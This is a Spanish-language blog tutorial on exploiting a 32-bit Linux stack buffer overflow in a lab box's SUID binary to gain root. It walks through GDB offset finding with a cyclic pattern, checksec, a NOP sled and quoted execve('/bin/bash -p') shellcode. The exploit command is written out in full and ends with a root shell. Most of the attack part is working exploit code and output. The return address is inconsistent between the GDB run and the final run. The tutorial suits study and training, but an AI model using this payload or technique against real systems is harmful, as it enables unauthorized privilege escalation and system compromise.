---
title: "Guía de Explotación: Buffer Overflow x32"
pubDatetime: 2025-09-30T10:00:00Z
draft: false
tags:
  - "BOF"
  - "x32"
  - "Assembly"
  - "Investigation"
description: "Guía técnica y práctica para comprender y explotar desbordamientos de búfer en arquitecturas x86 (32 bits) en entornos Linux."
heroImage: "/assets/images/posts/BufferOverflow/BufferOferflow32Bits.png"
---
En este módulo vamos a aprender a como explotar un **Buffer Overflow x32 bits ( Stack based [Linux x86 shellcode - execve(/bin/bash, [/bin/bash, -p], NULL) - 33 bytes])** para esto tenemos un laboratorio que para poder convertirnos en **Root** tenemos un binario que ejecuta este usuario privilegiado.

Antes de comenzar primero vamos a ver un poco de teoría sobre Buffer Overflow y entender el flujo de trabajo.

## ¿Qué es un Buffer Overflow?

Un **Buffer Overflow** (desbordamiento de búfer) es una vulnerabilidad de software que ocurre cuando un programa escribe datos en un búfer (una zona de memoria temporal) más allá de los límites asignados, sobrescribiendo así áreas adyacentes de la memoria.

### ¿Porqué sucede?

- Los programas reservan bloques de memoria de tamaño fijo (búferes) para almacenar datos.
- Si no se verifica correctamente el tamaño de los datos que se copian al búfer, se puede escribir **más allá de su espacio asignado**.
- Esto puede corromper otros datos en la pila (stack) o montón (heap), alterando el flujo normal del programa.

### Consecuencias

1. **Modificar variables adyacentes**.
2. **Alterar la dirección de retorno** de una función en la pila, redirigiendo la ejecución a código malicioso.
3. **Ejecutar código arbitrario**, a menudo un **shellcode** (código que abre una shell, por ejemplo).
4. **Provocar la caída del programa** (Denegación de Servicio).

## ¿Cómo funciona?

Los registros importantes para los ataques de desbordamiento de búfer son `ESP`, `EBP` y `EIP`. El primero, `ESP`, nos dice en qué parte del pila somos, por tanto, el ESPregistrar siempre marca la parte superior de la pila. El segundo, `EBP`, apunta a la base dirección de la pila. Finalmente, el registro `EIP` contiene la dirección de la siguiente instrucción a leer en el programa, por lo tanto, siempre apunta al segmento de memoria “Código de programa”.

![arq_bof](/assets/images/posts/BufferOverflow/arq_bof.png)

Cuando solemos programar algo o desarrollamos aplicaciones, se pueden usar funciones como: strcpy, gets, scanf y otros. Si estos no se validan en cuando a los bytes que se ha asignado en memoria, puede llegar a sobrescribir otras variables como el `EIP` alterando el flujo de ejecución.

## Explotación de StackBased

Entonces como mencionamos anteriormente, en esta parte hacemos un poco en redundancia sobre las variables clave que actúan cuando ocurre un **desbordamiento de buffer**.
`Estos registros son en máquinas de 32 bits (x86).`

Entonces se tiene:

1. **ESP:** Apunta al tope de la pila y se utiliza para agregar y eliminar datos de la pila.
2. **EBP:** Gestiona las funciones y procedimientos de la pila.
3. **EIP - RET:** Contiene la siguiente dirección de la memoria a la cual seguirá el flujo del programa.

![arq_bof](/assets/images/posts/BufferOverflow/arq_bof.png)

Entonces, empieza sobrescribiendo el **`ESP`** y así continua con los demás registros mencionados anteriormente.

Para realizar este análisis existe la herramienta **`GDB`**  que nos permite analizar binarios en bajo nivel y poder ver mejor como se realiza este proceso de **Buffer Overflow.**

## Ejemplo Práctico

Tenemos un laboratorio practico, donde vamos a demostrar como se explota un BufferOverflow, pasa que cuando queremos escalar privilegios a root, y buscamos por binarios que tienen el permiso SUID nos encontramos esto:

```bash
buffemr@buffemr:/opt$ find / -perm -4000 2>/dev/null
```

```bash
buffemr@buffemr:/opt$ ll /opt/dontexecute
-rwsrwxr-x 1 root root 7700 Jun 23  2021 /opt/dontexecute*
buffemr@buffemr:/opt$ 
```
Podemos ver la sen sus permisos, que pasa cuando lo ejecutamos:

```bash
buffemr@buffemr:/opt$ ./dontexecute 
Usage: ./dontexecute argument 
buffemr@buffemr:/opt$ 
```
Al momento de ejecutar nos pide pasarle un argumento, puedes traer el binario a tu maquina atacante para poder realizar pruebas y luego poder explotarlo en la maquina victima, lo pasé a mi maquina atacante como nombre `binary` .

```bash
> ls -la binary
.rwxr-xr-x root root 7.7 KB Sun Sep 28 18:00:53 2025  binary
```
Lo que debemos saber primero es cuantos bytes debemos pasarle como argumento para llegar a sobrescribir el registro `EIP` , abrimos la herramienta `GDB`

```bash
#Iniciar el GDB
gdb -q ./binary
```

Dentro del GDB, vamos a generar una secuencia cíclica para averiguar el Offset exacto donde un Overflow llega a sobrescribir el EIP

```bash
# Crear la secuencia cíclica en GDB
pattern  create
```
![bof_1](/assets/images/posts/BufferOverflow/bof_1.png)

lo ejecutamos con:

```bash
# Se ejecuta con la secuencia (argumento) que pide el binario en GDB
r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak 
```

Realizando la ejecución, ocurre el desbordamiento de Buffer y muestra el error.

![bof_2](/assets/images/posts/BufferOverflow/bof_2.png)

Podemos ver que ha ido sobrescribiendo desde el `ESP` hasta llegar al `EIP` y colocarle el valor de `daaf` , recordando siempre que `EIP` apunta a la siguiente dirección por la cual seguirá el flujo de ejecución, pero como `daaf` no es una dirección existente el programa colapsa.

Entonces ahora es donde se averigua el `OFFSET` cuantos caracteres tengo que introducir para llegar a sobrescribir el `EIP` (o mejor dicho, cantidad de bytes introducidos antes de `EIP`), entonces teniendo en cuenta el patrón creado anteriormente, vamos a realizar un filtro.

```bash
echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak' | grep 'daaf'
```

![bof_3](/assets/images/posts/BufferOverflow/bof_3.png)

Entonces, ¿Cuántos caracteres hay hasta daaf? , utiliza la función de GBD de la siguiente manera

```bash
# Averiguar OFFSET
pattern offset $eip
```

![bof_4](/assets/images/posts/BufferOverflow/bof_4.png)

Interpretando esto: “Tenemos que introducir 512 caracteres para llegar a sobrescribir el `EIP`", para probar esto, podemos jugar con Python para realizar pruebas, sabiendo esto, vamos a revisar la seguridad que presenta el binario, ejecute lo siguiente en la línea de comandos de `GDB`.

```bash
# Verificar seguridad del binario
checksec
[+] checksec for '/home/winter/Documentos/BufferOverflow/192.168.59.134/binary'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

> ⚠️ NX está desactivado, lo que conlleva a aprovecharnos de la pila para llenar una secuencia de ShellCodesy ejecutar las instrucciones que queramos, todo esto va a estar representado en lenguaje de bajo nivel para que la maquina pueda saber que queremos hacer.

![bof_5](/assets/images/posts/BufferOverflow/bof_5.png)

Nos aseguramos que controlamos el `EIP` con el siguiente script de Python

```bash
# Verificamos que controlamos EIP introduciendo 512 A (OFFSET) + CCCC que sería el valor del EIP
r $(python3 -c 'print("A"*512 + "CCCC")')
```

![bof_6](/assets/images/posts/BufferOverflow/bof_6.png)

Confirmando que si controlamos el `EIP` , en vez de meter `AAAA` o cualquier otro valor, podemos agregar NOPS , que es esto, básicamente un NOPSes una Instrucción en lenguaje ensamblador que no hace nada (no operation code).

>  Un NOPSse representa con el valor de:x90 

Entonces lo que haremos es:

- Llenar la pila de `NOPS` hasta cierto punto de modo que nuestro `ShellCode` vaya después de estos NOPSy poder ejecutar el `ShellCode` mediante el direccionamiento de `EIP`, esto se hace con el fin de que la explotación del `BufferOverflowno` se dañe por los desajustes de análisis de estas herramientas dentro y fuera de su entorno.

Puedes crear tu `ShellCode` con `MSFVenom` tambien puedes buscar algunos que están hechos y contemplados en GitHub.

![bof_6](/assets/images/posts/BufferOverflow/bof_7.png)

```bash
/*

Title: 	Linux x86 - execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 33 bytes
Author:	Jonathan Salwan
Mail:	submit@shell-storm.org
Web:	http://www.shell-storm.org

!Database of Shellcodes http://www.shell-storm.org/shellcode/


sh sets (euid, egid) to (uid, gid) if -p not supplied and uid < 100
Read more: http://www.faqs.org/faqs/unix-faq/shell/bash/#ixzz0mzPmJC49

sassembly of section .text:

08048054 <.text>:
 8048054:	6a 0b                	push   $0xb
 8048056:	58                   	pop    %eax
 8048057:	99                   	cltd   
 8048058:	52                   	push   %edx
 8048059:	66 68 2d 70          	pushw  $0x702d
 804805d:	89 e1                	mov    %esp,%ecx
 804805f:	52                   	push   %edx
 8048060:	6a 68                	push   $0x68
 8048062:	68 2f 62 61 73       	push   $0x7361622f
 8048067:	68 2f 62 69 6e       	push   $0x6e69622f
 804806c:	89 e3                	mov    %esp,%ebx
 804806e:	52                   	push   %edx
 804806f:	51                   	push   %ecx
 8048070:	53                   	push   %ebx
 8048071:	89 e1                	mov    %esp,%ecx
 8048073:	cd 80                	int    $0x80

*/

#include <stdio.h>

char shellcode[] = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
		   "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
		   "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
		   "\x51\x53\x89\xe1\xcd\x80";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();       
}
```

## Escenario (Escalda de Privilegios)

> El escenario de configuración anterior, simula un binario que se ejecuta como root, entonces todo el proceso que hemos hecho nos sirve para escalar privilegios hacia root valga la redundancia.

Ahora si, con todos estos conceptos claros, vamos a explotar ese `BufferOverflow` para otorgarnos una `bash privilegiada` o en otras palabras como Root, todo desde la maquina victima.

Entonces como con `512 caracteres` se sobrescribe el `EIP`, lo que haremos es restarle `- 33 Bytes`, lo que dice en el script de la shell code mas arriba, y en esos 33 bytes es donde va a ir nuesto ShellCode.

```bash
# No se ejecuta en GDB ni nada, es solo una simple operacion
echo "512-33" | bc
479 -> NOPS A INTRODUCIR 
```

Si tu ejecutas esta prueba

```bash
# Prueba para encontrar la direccion de nuestro ShellCode para contemplarlo en el EIP
# Dentro del GDB
r $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "B"*4')
```

![bof_8](/assets/images/posts/BufferOverflow/bof_8.png)

Como se han ejecutado y se ha agregado nuestros `NOPS` a la pila, podemos verlos con  el siguiente comando

```bash
# Dentro del GDB
x/300wx $esp
```

Los `NOPS` y el `ShellCode` estan sobrescribiendo primero el `ESP` y asi con los demás registros, nuestro `ShellCode` debe estar almacenado por ahí, el comando de arriba te mostrará mas información.

![bof_9](/assets/images/posts/BufferOverflow/bof_9.png)

![bof_10](/assets/images/posts/BufferOverflow/bof_10.png)

Entonces, podemos mandarle al `EIP` una dirección de cualquier `NOPS`, eso para que rediriga el flujo de ejecución hacia un `NoOperationCode`, esto no va a hacer nada y seguirá subiendo por cada `NOPS` hasta llegar a nuestro `ShellCode` y ahí es donde se va a producir la ejecución.

![bof_11](/assets/images/posts/BufferOverflow/bof_11.png)

Cojemos por ejemplo la dirección `0xffffd670` pero:

> En arquitectura x32 - x86, las direcciones se almacenan en orden inverso (byte menos significativo primero), esto por el  little-endian.

Entonces en `GDB`

```bash
(gdb) r $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x70\xd6\xff\xff"')
```
![bof_12](/assets/images/posts/BufferOverflow/bof_12.png)

Vea como el `ShellCode` que tiene como valor `/bin/bash -p` se ha ejecutado correctamente, esto significa una explotación de `BufferOverflow x32` correctamente.

```bash
exit
quit

# Esto para que te salgas del GDB y ejecutar el binario con el payload anterior
```

```bash
buffemr@buffemr:/opt$ ./dontexecute $(python -c 'print "\x90"*479 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x70\xdf\xff\xff"')
bash-4.4# whoami
root
bash-4.4# 
```

![bof_13](/assets/images/posts/BufferOverflow/bof_13.png)

## Recomendaciones

- Suele pasar que por cada ejecución cambia la memoria, es necesario verificar la escritura en el `EIP` y ver la pila y colocar una nueva dirección para `EIP`.

## Referencias

- [https://shell-storm.org/shellcode/files/shellcode-606.html](https://shell-storm.org/shellcode/files/shellcode-606.html)
- [https://www.davidromerotrejo.com/2018/09/buffer-overflow-attack.html](https://www.davidromerotrejo.com/2018/09/buffer-overflow-attack.html)
- [https://www.ired.team/~gitbook/ogimage/-MXGqWDEDWYaShWhb0tP](https://www.ired.team/~gitbook/ogimage/-MXGqWDEDWYaShWhb0tP)